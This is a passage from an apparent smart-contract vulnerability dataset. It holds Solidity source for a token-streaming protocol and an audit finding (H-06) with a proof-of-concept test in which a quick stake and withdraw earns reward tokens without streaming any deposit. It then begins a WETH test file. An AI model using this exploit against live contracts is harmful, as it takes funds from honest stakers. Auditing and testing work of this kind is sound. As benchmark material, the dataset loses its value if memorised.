// some time has passed since this user last interacted\n                // update ts not yet streamed\n                ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream - ts.lastUpdate));\n                ts.lastUpdate = uint32(block.timestamp);\n            }\n\n            // handle global unstreamed\n            uint32 tdelta = uint32(block.timestamp - lastUpdate);\n            // stream tokens over\n            if (tdelta > 0 && unstreamed > 0) {\n                uint256 globalStreamingSpeedPerSecond = (uint256(unstreamed) * 10**6)/ (endStream - lastUpdate);\n                unstreamed -= uint112((uint256(tdelta) * globalStreamingSpeedPerSecond) / 10**6);\n            }\n            // already ensure that blocktimestamp is less than endStream so guaranteed ok here\n            lastUpdate = uint32(block.timestamp);\n        } else {\n            if (ts.lastUpdate == 0) {\n                ts.lastUpdate = startTime;\n            }\n            if (lastUpdate == 0) {\n                lastUpdate = startTime;\n            }\n        }\n    }\n\n\n    function lockInternal() internal {\n        require(unlocked == 1, \"re\");\n        unlocked = 2;\n    }\n    modifier lock {\n        lockInternal();\n        _;\n        unlocked = 1;\n    }\n\n    constructor(\n        uint64 _streamId,\n        address creator,\n        bool _isSale,\n        address _rewardToken,\n        address _depositToken,\n        uint32 _startTime,\n        uint32 _streamDuration,\n        uint32 _depositLockDuration,\n        uint32 _rewardLockDuration,\n        uint16 _feePercent,\n        bool _feeEnabled\n\n    )\n        LockeERC20(_depositToken, _streamId, _startTime + _streamDuration)\n        ExternallyGoverned(msg.sender) // inherit factory governance\n        public \n    {\n        // set fee info\n        feePercent = _feePercent;\n        feeEnabled = _feeEnabled;\n\n        // limit feePercent\n        require(feePercent < 10000, \"fee\");\n    \n        // store streamParams\n        startTime = _startTime;\n        streamDuration = _streamDuration;\n        depositLockDuration = _depositLockDuration;\n        rewardLockDuration = _rewardLockDuration;\n\n        endStream = startTime + streamDuration;\n        endDepositLock = endStream + depositLockDuration;\n        endRewardLock = endStream + rewardLockDuration;\n    \n        // set tokens\n        depositToken = _depositToken;\n        rewardToken = _rewardToken;\n\n        // set streamId\n        streamId = _streamId;\n\n        // set sale info\n        isSale = _isSale;\n    \n        streamCreator = creator;\n\n        depositDecimalsOne = uint112(10**ERC20(depositToken).decimals());\n    }\n\n    /**\n     * @dev Returns relevant internal token amounts\n    **/\n    function tokenAmounts() public view returns (uint112, uint112, uint112, uint112) {\n        return (rewardTokenAmount, depositTokenAmount, rewardTokenFeeAmount, depositTokenFlashloanFeeAmount);\n    }\n\n    /**\n     * @dev Returns fee parameters\n    **/\n    function feeParams() public view returns (uint16, bool) {\n        return (feePercent, feeEnabled);\n    }\n\n    /**\n     * @dev Returns stream parameters\n    **/\n    function streamParams() public view returns (uint32,uint32,uint32,uint32) {\n        return (\n            startTime,\n            streamDuration,\n            depositLockDuration,\n            rewardLockDuration\n        );\n    }\n\n    function lastApplicableTime() internal view returns (uint32) {\n        return block.timestamp <= endStream ? uint32(block.timestamp) : endStream;\n    }\n\n    function rewardPerToken() public view returns (uint256) {\n        if (totalVirtualBalance == 0) {\n            return cumulativeRewardPerToken;\n        } else {\n            // \u2206time*rewardTokensPerSecond*oneDepositToken / totalVirtualBalance\n            return cumulativeRewardPerToken + (\n                ((uint256(lastApplicableTime()) - lastUpdate) * rewardTokenAmount * depositDecimalsOne/streamDuration) \n                / totalVirtualBalance\n            );\n        }\n    }\n\n    function dilutedBalance(uint112 amount) internal view returns (uint256) {\n        // duration / timeRemaining * amount\n        if (block.timestamp < startTime) {\n            return amount;\n        } else {\n            uint32 timeRemaining = endStream - uint32(block.timestamp);\n            return ((uint256(streamDuration) * amount * 10**6) / timeRemaining) / 10**6;\n        }\n    }\n\n    function getEarned(address who) public view returns (uint256) {\n        TokenStream storage ts = tokensNotYetStreamed[who];\n        return earned(ts, rewardPerToken());\n    }\n\n    function earned(TokenStream storage ts, uint256 currCumRewardPerToken) internal view returns (uint112) {\n        return uint112(ts.virtualBalance * (currCumRewardPerToken - ts.lastCumulativeRewardPerToken) / depositDecimalsOne) + ts.rewards;\n    }\n\n    /**\n     * @dev Allows _anyone_ to fund this stream, if its before the stream start time\n    **/\n    function fundStream(uint112 amount) public lock {\n        require(amount > 0, \"amt\");\n        require(block.timestamp < startTime, \"time\");\n        uint112 amt;\n\n        // transfer from sender\n        uint256 prevBal = ERC20(rewardToken).balanceOf(address(this));\n        ERC20(rewardToken).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(rewardToken).balanceOf(address(this));\n        require(newBal < type(uint112).max && newBal > prevBal, \"erc\");\n\n        amount = uint112(newBal - prevBal);\n        // if fee is enabled, take a fee\n        if (feeEnabled) {\n            // Safety:\n            //  1. feePercent & y are casted up to u256, so cannot overflow when multiplying\n            //  2. downcast is safe because (x*y)/MAX_X is guaranteed to be smaller than y which is uint112\n            //  3. amount is guaranteed to be greater than feeAmt\n            uint112 feeAmt;\n            unchecked {\n                feeAmt = uint112(uint256(feePercent) * uint256(amount) / 10000); \n                amt = amount - feeAmt;\n            }\n\n            // since this operation can be repeated, we cannot assume no overflow so use checked math\n            rewardTokenFeeAmount += feeAmt;\n            rewardTokenAmount += amt;\n        } else {\n            amt = amount;\n            rewardTokenAmount += amt;\n        }\n        \n        emit StreamFunded(amt);\n    }\n\n    /**\n     *  @dev Deposits depositTokens into this stream\n     * \n     *  additionally, updates tokensNotYetStreamed\n    */ \n    function stake(uint112 amount) public lock updateStream(msg.sender) {\n        require(amount > 0, \"amt\");\n\n        // checked in updateStream\n        // require(block.timestamp < endStream, \"stake:!stream\");\n\n        // transfer tokens over\n        uint256 prevBal = ERC20(depositToken).balanceOf(address(this));\n        ERC20(depositToken).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(depositToken).balanceOf(address(this));\n        require(newBal <= type(uint112).max && newBal > prevBal, \"erc\");\n        \n        uint112 trueDepositAmt = uint112(newBal - prevBal);\n\n        depositTokenAmount += trueDepositAmt;\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        ts.tokens += trueDepositAmt;\n\n        uint256 virtualBal = dilutedBalance(trueDepositAmt);\n        ts.virtualBalance += virtualBal;\n        totalVirtualBalance += virtualBal;\n        unstreamed += trueDepositAmt;\n\n        if (!isSale) {\n            // not a straight sale, so give the user some receipt tokens\n            _mint(msg.sender, trueDepositAmt);\n        } else {\n        }\n\n        emit Staked(msg.sender, trueDepositAmt);\n    }\n\n    /**\n     *  @dev Allows a stream depositor to withdraw a specific amount of depositTokens during a stream,\n     *  up to their tokensNotYetStreamed amount\n     * \n     *  additionally, updates tokensNotYetStreamed\n    */ \n    function withdraw(uint112 amount) public lock updateStream(msg.sender) {\n        require(amount > 0, \"amt\");\n\n        // checked in updateStream\n        // is the stream still going on? thats the only time a depositer can withdraw\n        // require(block.timestamp < endStream, \"withdraw:!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n\n        require(ts.tokens >= amount, \"amt\");\n        ts.tokens -= amount;\n\n        uint256 virtualBal = dilutedBalance(amount);\n        ts.virtualBalance -= virtualBal;\n        totalVirtualBalance -= virtualBal;\n        depositTokenAmount -= amount;\n        if (!isSale) {\n            _burn(msg.sender, amount);\n        } else {\n        }\n\n        // do the transfer\n        ERC20(depositToken).safeTransfer(msg.sender, amount);\n\n        emit Withdrawn(msg.sender, amount);\n    }\n\n    /**\n     *  @dev Allows a stream depositor to exit their entire remaining tokens that haven't streamed\n     *  and burns receiptTokens if its not a sale.\n     * \n     *  additionally, updates tokensNotYetStreamed. Lock is done in withdraw\n    */ \n    function exit() public updateStream(msg.sender) {\n        // checked in updateStream\n        // is the stream still going on? thats the only time a depositer can withdraw\n        // require(block.timestamp < endStream, \"withdraw:!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        uint112 amount = ts.tokens;\n        withdraw(amount);\n    }\n\n    /**\n     *  @dev Allows anyone to incentivize this stream with extra tokens\n     *  and requires the incentive to not be the reward or deposit token\n    */ \n    function createIncentive(address token, uint112 amount) public lock {\n        require(token != rewardToken && token != depositToken, \"inc\");\n        \n        uint256 prevBal = ERC20(token).balanceOf(address(this));\n        ERC20(token).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(token).balanceOf(address(this));\n        require(newBal <= type(uint112).max && newBal > prevBal, \"erc\");\n\n        uint112 amt = uint112(newBal - prevBal);\n        incentives[token] += amt;\n        emit StreamIncentivized(token, amt);\n    }\n\n    /**\n     *  @dev Allows the stream creator to claim an incentive once the stream is done\n    */ \n    function claimIncentive(address token) public lock {\n        // creator is claiming\n        require(msg.sender == streamCreator, \"!creator\");\n        // stream ended\n        require(block.timestamp >= endStream, \"stream\");\n        uint112 amount = incentives[token];\n        require(amount > 0, \"amt\");\n        incentives[token] = 0;\n        ERC20(token).safeTransfer(msg.sender, amount);\n        emit StreamIncentiveClaimed(token, amount);\n    }\n\n    /**\n     *  @dev Allows a receipt token holder to reclaim deposit tokens if the deposit lock is done & their receiptToken amount\n     *  is greater than the requested amount\n    */ \n    function claimDepositTokens(uint112 amount) public lock {\n        require(!isSale, \"sale\");\n        // NOTE: given that endDepositLock is strictly *after* the last time withdraw or exit is callable\n        // we dont need to updateStream(msg.sender)\n        require(amount > 0, \"amt\");\n\n        // is the stream over + the deposit lock period over? thats the only time receiptTokens can be burned for depositTokens after stream is over\n        require(block.timestamp > endDepositLock, \"lock\");\n\n        // burn the receiptTokens\n        _burn(msg.sender, amount);\n\n        redeemedDepositTokens += amount;\n\n        // send the receipt token holder back the funds\n        ERC20(depositToken).safeTransfer(msg.sender, amount);\n\n        emit DepositTokensReclaimed(msg.sender, amount);\n    }\n\n    /**\n     *  @dev Allows a receipt token holder (or original depositor in case of a sale) to claim their rewardTokens\n    */ \n    function claimReward() public lock {\n        require(block.timestamp > endRewardLock, \"lock\");\n\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        // accumulate reward per token info\n        cumulativeRewardPerToken = rewardPerToken();\n\n        // update user rewards\n        ts.rewards = earned(ts, cumulativeRewardPerToken);\n        // update users last cumulative reward per token\n        ts.lastCumulativeRewardPerToken = cumulativeRewardPerToken;\n\n        lastUpdate = lastApplicableTime();\n\n        uint256 rewardAmt = ts.rewards;\n        ts.rewards = 0;\n\n        require(rewardAmt > 0, \"amt\");\n\n        // transfer the tokens\n        ERC20(rewardToken).safeTransfer(msg.sender, rewardAmt);\n\n        emit RewardsClaimed(msg.sender, rewardAmt);\n    }\n\n    /**\n     *  @dev Allows a creator to claim sold tokens if the stream has ended & this contract is a sale\n    */ \n    function creatorClaimSoldTokens(address destination) public lock {\n        // can only claim when its a sale\n        require(isSale, \"!sale\");\n\n        // only can claim once\n        require(!claimedDepositTokens, \"claimed\");\n        // creator is claiming\n        require(msg.sender == streamCreator, \"!creator\");\n        // stream ended\n        require(block.timestamp >= endStream, \"stream\");\n        \n        uint112 amount = depositTokenAmount;\n        claimedDepositTokens = true;\n\n        ERC20(depositToken).safeTransfer(destination, amount);\n\n        emit SoldTokensClaimed(destination, amount);\n    }\n\n    /**\n     *  @dev Allows the governance contract of the factory to select a destination\n     *  and transfer fees (in rewardTokens) to that address totaling the total fee amount\n    */ \n    function claimFees(address destination) public lock externallyGoverned {\n        // Stream is done\n        require(block.timestamp >= endStream, \"stream\");\n\n        // reset fee amount\n        uint112 fees = rewardTokenFeeAmount;\n        if (fees > 0) {\n            rewardTokenFeeAmount = 0;\n\n            // transfer and emit event\n            ERC20(rewardToken).safeTransfer(destination, fees);\n            emit FeesClaimed(rewardToken, destination, fees);\n        }\n\n        fees = depositTokenFlashloanFeeAmount;\n        if (fees > 0) {\n            depositTokenFlashloanFeeAmount = 0;\n\n            // transfer and emit event\n            ERC20(depositToken).safeTransfer(destination, fees);\n\n            emit FeesClaimed(depositToken, destination, fees);\n        }\n        \n    }\n\n    // ======== Non-protocol functions ========\n\n    /**\n     *  @dev Allows the stream creator to save tokens\n     *  There are some limitations to this:\n     *      1. if its deposit token:\n     *          - DepositLock is fully done\n     *          - There are excess deposit tokens (balance - depositTokenAmount)\n     *      2. if its the reward token:\n     *          - RewardLock is fully done\n     *          - Excess defined as balance - (rewardTokenAmount + rewardTokenFeeAmount)\n     *      3. if incentivized:\n     *          - excesss defined as bal - incentives[token]\n    */ \n    function recoverTokens(address token, address recipient) public lock {\n        // NOTE: it is the stream creators responsibility to save\n        // tokens on behalf of their users.\n        require(msg.sender == streamCreator, \"!creator\");\n        if (token == depositToken) {\n            require(block.timestamp > endDepositLock, \"time\");\n            // get the balance of this contract\n            // check what isnt claimable by either party\n            uint256 excess = ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens);\n            // allow saving of the token\n            ERC20(token).safeTransfer(recipient, excess);\n\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n        \n        if (token == rewardToken) {\n            require(block.timestamp > endRewardLock, \"time\");\n            // check current balance vs internal balance\n            //\n            // NOTE: if a token rebases, i.e. changes balance out from under us,\n            // most of this contract breaks and rugs depositors. this isn't exclusive\n            // to this function but this function would in theory allow someone to rug\n            // and recover the excess (if it is worth anything)\n\n            // check what isnt claimable by depositors and governance\n            uint256 excess = ERC20(token).balanceOf(address(this)) - (rewardTokenAmount + rewardTokenFeeAmount);\n            ERC20(token).safeTransfer(recipient, excess);\n\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n\n        if (incentives[token] > 0) {\n            require(block.timestamp >= endStream, \"stream\");\n            uint256 excess = ERC20(token).balanceOf(address(this)) - incentives[token];\n            ERC20(token).safeTransfer(recipient, excess);\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n\n        // not reward token nor deposit nor incentivized token, free to transfer\n        uint256 bal = ERC20(token).balanceOf(address(this));\n        ERC20(token).safeTransfer(recipient, bal);\n        emit RecoveredTokens(token, recipient, bal);\n    }\n\n    /**\n     *  @dev Allows anyone to flashloan reward or deposit token for a 10bps fee\n    */\n    function flashloan(address token, address to, uint112 amount, bytes memory data) public lock {\n        require(token == depositToken || token == rewardToken, \"erc\");\n\n        uint256 preDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 preRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        ERC20(token).safeTransfer(to, amount);\n\n        // the `to` contract should have a public function with the signature:\n        // function lockeCall(address initiator, address token, uint256 amount, bytes memory data);\n        LockeCallee(to).lockeCall(msg.sender, token, amount, data);\n\n        uint256 postDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 postRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        uint112 feeAmt = amount * 10 / 10000; // 10bps fee\n\n        if (token == depositToken) {\n            depositTokenFlashloanFeeAmount += feeAmt;\n            require(preDepositTokenBalance + feeAmt <= postDepositTokenBalance, \"f1\");\n            require(preRewardTokenBalance <= postRewardTokenBalance, \"f2\");\n        } else {\n            rewardTokenFeeAmount += feeAmt;\n            require(preDepositTokenBalance <= postDepositTokenBalance, \"f3\");\n            require(preRewardTokenBalance + feeAmt <= postRewardTokenBalance, \"f4\");\n        }\n\n        emit Flashloaned(token, msg.sender, amount, feeAmt);\n    }\n\n    /**\n     *  @dev Allows inherited governance contract to call functions on behalf of this contract\n     *  This is a potentially dangerous function so to ensure trustlessness, *all* balances\n     *  that may matter are guaranteed to not change.\n     * \n     *  The primary usecase is for claiming potentially airdrops that may have accrued on behalf of this contract\n    */\n    function arbitraryCall(address who, bytes memory data) public lock externallyGoverned {\n        // cannot have an active incentive for the callee\n        require(incentives[who] == 0, \"inc\");\n        // cannot be to deposit token nor reward token\n        require(who != depositToken && who != rewardToken, \"erc\");\n\n        // get token balances\n        uint256 preDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 preRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        (bool success, bytes memory _ret) = who.call(data);\n        require(success);\n\n        // require no change in balances\n        uint256 postDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 postRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n        require(preDepositTokenBalance == postDepositTokenBalance && preRewardTokenBalance == postRewardTokenBalance, \"erc\");\n    }\n}\n\ncontract StreamFactory is Governed {\n\n    // ======= Structs ========\n    struct GovernableStreamParams {\n        uint32 maxDepositLockDuration;\n        uint32 maxRewardLockDuration;\n        uint32 maxStreamDuration;\n        uint32 minStreamDuration;\n    }\n\n    struct GovernableFeeParams {\n        uint16 feePercent;\n        bool feeEnabled;\n    }\n\n    // ======= Storage ========\n    GovernableStreamParams public streamParams;\n    GovernableFeeParams public feeParams;\n    uint64 public currStreamId; \n\n    uint16 constant MAX_FEE_PERCENT = 500; // 500/10000 == 5%\n\n    // =======  Events  =======\n    event StreamCreated(uint256 indexed stream_id, address stream_addr);\n    event StreamParametersUpdated(GovernableStreamParams oldParams, GovernableStreamParams newParams);\n    event FeeParametersUpdated(GovernableFeeParams oldParams, GovernableFeeParams newParams);\n\n    constructor(address _governor, address _emergency_governor) public Governed(_governor, _emergency_governor) {\n        streamParams = GovernableStreamParams({\n            maxDepositLockDuration: 52 weeks,\n            maxRewardLockDuration: 52 weeks,\n            maxStreamDuration: 2 weeks,\n            minStreamDuration: 1 hours\n        });\n    }\n\n    /**\n     * @dev Deploys a minimal contract pointing to streaming logic. This contract will also be the token contract\n     * for the receipt token. It custodies the depositTokens until depositLockDuration is complete. After\n     * lockDuration is completed, the depositTokens can be claimed by the original depositors\n     * \n    **/\n    function createStream(\n        address rewardToken,\n        address depositToken,\n        uint32 startTime,\n        uint32 streamDuration,\n        uint32 depositLockDuration,\n        uint32 rewardLockDuration,\n        bool isSale\n    )\n        public\n        returns (Stream)\n    {\n        // perform checks\n\n        {\n            require(startTime >= block.timestamp, \"past\");\n            require(streamDuration >= streamParams.minStreamDuration && streamDuration <= streamParams.maxStreamDuration, \"stream\");\n            require(depositLockDuration <= streamParams.maxDepositLockDuration, \"lock\");\n            require(rewardLockDuration <= streamParams.maxRewardLockDuration, \"reward\");\n        }\n        \n\n        // TODO: figure out sane salt, i.e. streamid + x? streamid guaranteed to be unique\n        uint64 that_stream = currStreamId;\n        currStreamId += 1;\n        bytes32 salt = bytes32(uint256(that_stream));\n\n        Stream stream = new Stream{salt: salt}(\n            that_stream,\n            msg.sender,\n            isSale,\n            rewardToken,\n            depositToken,\n            startTime,\n            streamDuration,\n            depositLockDuration,\n            rewardLockDuration,\n            feeParams.feePercent,\n            feeParams.feeEnabled\n        );\n\n        emit StreamCreated(that_stream, address(stream));\n\n        return stream;\n    }\n\n    function updateStreamParams(GovernableStreamParams memory newParams) public governed {\n        // DATA VALIDATION:\n        //  there is no real concept of \"sane\" limits here, and if misconfigured its ultimated\n        //  not a massive deal so no data validation is done\n        GovernableStreamParams memory old = streamParams;\n        streamParams = newParams;\n        emit StreamParametersUpdated(old, newParams);\n    }\n\n    function updateFeeParams(GovernableFeeParams memory newFeeParams) public governed {\n        require(newFeeParams.feePercent <= MAX_FEE_PERCENT, \"fee\");\n        GovernableFeeParams memory old = feeParams;\n        feeParams = newFeeParams;\n        emit FeeParametersUpdated(old, newFeeParams);\n    }\n}\n\n\n",
        "CodeNames": [
            "WETH.t.sol",
            "Locke.t.sol",
            "Locke.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-06",
                "Location": [
                    "//solidity\nfunction test_quickDepositAndWithdraw() public {\n    //// SETUP\n    // accounting (to proof attack): save the rewardBalance of alice.\n    uint StartBalanceA = testTokenA.balanceOf(address(alice));\n    uint112 stakeAmount = 10_000;\n\n    // start stream and fill it\n    (\n        uint32 maxDepositLockDuration,\n        uint32 maxRewardLockDuration,\n        uint32 maxStreamDuration,\n        uint32 minStreamDuration\n    ) = defaultStreamFactory.streamParams();\n\n    uint64 nextStream = defaultStreamFactory.currStreamId();\n    Stream stream = defaultStreamFactory.createStream(\n        address(testTokenA),\n        address(testTokenB),\n        uint32(block.timestamp + 10), \n        maxStreamDuration,\n        maxDepositLockDuration,\n        0,\n        false\n        // false,\n        // bytes32(0)\n    );\n    \n    testTokenA.approve(address(stream), type(uint256).max);\n    stream.fundStream(1_000_000_000);\n\n    // wait till the stream starts\n    hevm.warp(block.timestamp + 16);\n    hevm.roll(block.number + 1);\n\n    // just interact with contract to fill \"lastUpdate\" and \"ts.lastUpdate\" \n// without changing balances inside of Streaming contract\n    alice.doStake(stream, address(testTokenB), stakeAmount);\n    alice.doWithdraw(stream, stakeAmount);\n\n\n    ///// ATTACK COMES HERE\n    // stake\n    alice.doStake(stream, address(testTokenB), stakeAmount);\n\n    // wait a block\n    hevm.roll(block.number + 1);\n    hevm.warp(block.timestamp + 16);\n\n    // withdraw soon thereafter\n    alice.doWithdraw(stream, stakeAmount);\n\n    // finish the stream\n    hevm.roll(block.number + 9999);\n    hevm.warp(block.timestamp + maxDepositLockDuration);\n\n    // get reward\n    alice.doClaimReward(stream);\n\n\n    // accounting (to proof attack): save the rewardBalance of alice / save balance of stakeToken\n    uint EndBalanceA = testTokenA.balanceOf(address(alice));\n    uint EndBalanceB = testTokenB.balanceOf(address(alice));\n\n    // Stream returned everything we gave it\n    // (doStake sets balance of alice out of thin air = we compare end balance against our (thin air) balance)\n    assert(stakeAmount == EndBalanceB);\n\n    // we gained reward token without risk\n    assert(StartBalanceA == 0);\n    assert(StartBalanceA < EndBalanceA);\n    emit log_named_uint(\"alice gained\", EndBalanceA);\n}\n",
                    "zsh\n    dapp test --verbosity=2 --match \"test_quickDepositAndWithdraw\" 2 /dev/null\n    Running 1 tests for src/test/Locke.t.sol:StreamTest\n    PASS] test_quickDepositAndWithdraw() (gas: 4501209)\n\n    Success: test_quickDepositAndWithdraw\n\n      alice gained: 13227\n"
                ],
                "Type": " Creating rewardTokens without streaming depositTokens",
                "Description": "\n\nstake and withdraws can generate rewardTokens without streaming depositTokens.\nIt does not matter whether the stream is a sale or not.\n\nThe following lines can increase the reward balance on a withdraw some time after stake:\n<https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L219:L222\n\n    // accumulate reward per token info\n    cumulativeRewardPerToken = rewardPerToken();\n\n    // update user rewards\n    ts.rewards = earned(ts, cumulativeRewardPerToken);\n\nWhile the following line can be gamed in order to not stream any tokens (same withdraw tx).\n\nSpecifically an attacker can arrange to create a fraction less than zero thereby substracting zero.\n\n<https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L229\n\n    ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream ts.lastUpdate));\n    // WARDEN TRANSLATION: (elapsedSecondsSinceStake * stakeAmount) / (endStreamTimestamp stakeTimestamp)\n\nA succesful attack increases the share of rewardTokens of the attacker.\n\nThe attack can be repeated every block increasing the share further.\nThe attack could be done from multiple EOA increasing the share further.\nIn short: Attackers can create loss of funds for (honest) stakers.\n\nThe economic feasability of the attack depends on:\n\n*   staked amount (times number of attacks) vs total staked amount\n*   relative value of rewardToken to gasprice\n\n\n\nThe following was added to Locke.t.sol for the StreamTest Contract to simulate the attack from one EOA.\nsolidity\nfunction test_quickDepositAndWithdraw() public {\n    //// SETUP\n    // accounting (to proof attack): save the rewardBalance of alice.\n    uint StartBalanceA = testTokenA.balanceOf(address(alice));\n    uint112 stakeAmount = 10_000;\n\n    // start stream and fill it\n    (\n        uint32 maxDepositLockDuration,\n        uint32 maxRewardLockDuration,\n        uint32 maxStreamDuration,\n        uint32 minStreamDuration\n    ) = defaultStreamFactory.streamParams();\n\n    uint64 nextStream = defaultStreamFactory.currStreamId();\n    Stream stream = defaultStreamFactory.createStream(\n        address(testTokenA),\n        address(testTokenB),\n        uint32(block.timestamp + 10), \n        maxStreamDuration,\n        maxDepositLockDuration,\n        0,\n        false\n        // false,\n        // bytes32(0)\n    );\n    \n    testTokenA.approve(address(stream), type(uint256).max);\n    stream.fundStream(1_000_000_000);\n\n    // wait till the stream starts\n    hevm.warp(block.timestamp + 16);\n    hevm.roll(block.number + 1);\n\n    // just interact with contract to fill \"lastUpdate\" and \"ts.lastUpdate\" \n// without changing balances inside of Streaming contract\n    alice.doStake(stream, address(testTokenB), stakeAmount);\n    alice.doWithdraw(stream, stakeAmount);\n\n\n    ///// ATTACK COMES HERE\n    // stake\n    alice.doStake(stream, address(testTokenB), stakeAmount);\n\n    // wait a block\n    hevm.roll(block.number + 1);\n    hevm.warp(block.timestamp + 16);\n\n    // withdraw soon thereafter\n    alice.doWithdraw(stream, stakeAmount);\n\n    // finish the stream\n    hevm.roll(block.number + 9999);\n    hevm.warp(block.timestamp + maxDepositLockDuration);\n\n    // get reward\n    alice.doClaimReward(stream);\n\n\n    // accounting (to proof attack): save the rewardBalance of alice / save balance of stakeToken\n    uint EndBalanceA = testTokenA.balanceOf(address(alice));\n    uint EndBalanceB = testTokenB.balanceOf(address(alice));\n\n    // Stream returned everything we gave it\n    // (doStake sets balance of alice out of thin air = we compare end balance against our (thin air) balance)\n    assert(stakeAmount == EndBalanceB);\n\n    // we gained reward token without risk\n    assert(StartBalanceA == 0);\n    assert(StartBalanceA < EndBalanceA);\n    emit log_named_uint(\"alice gained\", EndBalanceA);\n}\n\n\n\nzsh\n    dapp test --verbosity=2 --match \"test_quickDepositAndWithdraw\" 2 /dev/null\n    Running 1 tests for src/test/Locke.t.sol:StreamTest\n    PASS] test_quickDepositAndWithdraw() (gas: 4501209)\n\n    Success: test_quickDepositAndWithdraw\n\n      alice gained: 13227\n\n\ndapptools\n\n",
                "Repair": "\nEnsure staked tokens can not generate reward tokens without streaming deposit tokens. First idea that comes to mind is making following line\nhttps://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L220\ndependable on a positive amount  0 of:\nhttps://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L229\n\nbrockelmore (Streaming Protocol) confirmed(https://github.com/code-423n4/2021-11-streaming-findings/issues/166)\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity 0.8.10;\n\nimport {DSTestPlus} from \"./utils/DSTestPlus.sol\";\nimport {DSInvariantTest} from \"./utils/DSInvariantTest.sol\";\n\nimport {SafeTransferLib} from \"../utils/SafeTransferLib.sol\";\n\nimport {WETH} from \"../tokens/WETH.sol\";\n\ncontract WETHTest is DSTestPlus {\n    WETH weth;\n\n    function setUp() public {\n        weth = new WETH();\n    }\n\n    function testDeposit() public {\n        assertEq(weth.balanceOf(address(this)), 0);\n        assertEq(weth.totalSupply(), 0);\n\n        SafeTransferLib.safeTransferETH(address(weth), 1 ether);\n\n        assertEq(weth.balanceOf(address(this)), 1 ether);\n        assertEq(weth.totalSupply(), 1 ether);\n    }\n\n    function testFallbackDeposit() public {\n        assertEq(weth.balanceOf(address(this)), 0);\n        assertEq(weth.totalSupply(), 0);\n\n        weth.deposit{value: 1 ether}();\n\n        assertEq(weth.balanceOf(address(this)), 1 ether);\n        assertEq(weth.totalSupply(), 1 ether);\n    }\n\n    function testWithdraw() public {\n        uint256 startingBalance = address(this).balance;\n\n        weth.deposit{value: 1 ether}();\n\n        weth.withdraw(1 ether);\n\n        uint256 balanceAfterWithdraw = address(this).balance;\n\n        assertEq(balanceAfterWithdraw, startingBalance);\n        assertEq(weth.balanceOf(address(this)), 0);\n        assertEq(weth.totalSupply(), 0);\n    }\n\n    function testPartialWithdraw() public {\n        weth.deposit{value: 1 ether}();\n\n        uint256 balanceBeforeWithdraw = address(this).balance;\n\n        weth.withdraw(0.5 ether);\n\n        uint256 balanceAfterWithdraw = address(this).balance;\n\n        assertEq(balanceAfterWithdraw, balanceBeforeWithdraw + 0.5 ether);\n        assertEq(weth.balanceOf(address(this)), 0.5 ether);\n        assertEq(weth.totalSupply(), 0.5 ether);\n    }\n\n    function testDeposit(uint256 amount) public {\n        if (amount > address(this).balance) return;\n\n        assertEq(weth.balanceOf(address(this)), 0);\n        assertEq(weth.totalSupply(), 0);\n\n        SafeTransferLib.safeTransferETH(address(weth), amount);\n\n        assertEq(weth.balanceOf(address(this)), amount);\n        assertEq(weth.totalSupply(), amount);\n    }\n\n    function testFallbackDeposit(uint256 amount) public {\n        if (amount > address(this).balance) return;\n\n        assertEq(weth.balanceOf(address(this)), 0);\n        assertEq(weth.totalSupply(), 0);\n\n        weth.deposit{value: amount}();\n\n        assertEq(weth.balanceOf(address(this)), amount);\n        assertEq(weth.totalSupply(), amount);\n    }\n\n    function testWithdraw(uint256 depositAmount, uint256 withdrawAmount) public {\n        if (depositAmount > address(this).balance) return;\n        if (withdrawAmount > depositAmount) return;\n\n        weth.deposit{value: depositAmount}();\n\n        uint256 balanceBeforeWithdraw = address(this).balance;\n\n        weth.withdraw(withdrawAmount);\n\n        uint256 balanceAfterWithdraw = address(this).balance;\n\n        assertEq(balanceAfterWithdraw, balanceBeforeWithdraw + withdrawAmount);\n        assertEq(weth.balanceOf(address(this)), depositAmount - withdrawAmount);\n        assertEq(weth.totalSupply(), depositAmount - withdrawAmount);\n    }\n\n    receive() external payable {}\n}\n\ncontract WETHInvariants is DSTestPlus, DSInvariantTest {\n    WETHTester wethTester;\n    WETH weth;\n\n    function setUp() public {\n        weth = new WETH();\n        wethTester = new WETHTester{value: address(this).balance}(weth);\n\n        addTargetContract(address(wethTester));\n    }\n\n    function invariantTotalSupplyEqualsBalance() public {\n        assertEq(address(weth).balance, weth.totalSupply());\n    }\n}\n\ncontract WETHTester {\n    WETH weth;\n\n    constructor(WETH _weth) payable {\n        weth = _weth;\n    }\n\n    function deposit(uint256 amount) public {\n        weth.deposit{value: amount}();\n    }\n\n    function fallbackDeposit(uint256 amount) public {\n        SafeTransferLib.safeTransferETH(address(weth), amount);\n    }\n\n    